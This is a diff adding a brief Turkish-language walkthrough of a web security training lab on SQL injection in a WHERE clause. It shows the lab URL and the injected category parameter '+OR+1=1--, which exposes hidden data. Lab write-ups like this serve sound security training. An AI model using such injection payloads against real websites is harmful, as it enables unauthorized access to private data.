@@ -1,0 +1,7 @@
+LAB: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+
+1 - Bir kategori seçiyoruz.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=Accessories
+
+2 - Kategori parametresini '+OR+1=1-- ile değiştiriyoruz.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category='+OR+1=1--
